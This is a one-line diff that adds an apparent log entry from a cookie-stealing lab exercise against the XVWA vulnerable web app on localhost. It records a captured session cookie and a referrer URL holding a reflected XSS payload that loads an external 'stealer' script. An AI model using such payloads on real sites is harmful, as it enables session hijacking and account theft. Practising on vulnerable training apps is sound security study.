@@ -1,0 +1,1 @@
+Cookie: PHPSESSID=bjj1876ukjkldnept3a12ql64p | Referrer: http://localhost/xvwa/vulnerabilities/reflected_xss/?item=test%3Cscript%20src=%22http://localhost/stealer-xss/js.js%22%3E%3C/script%3E
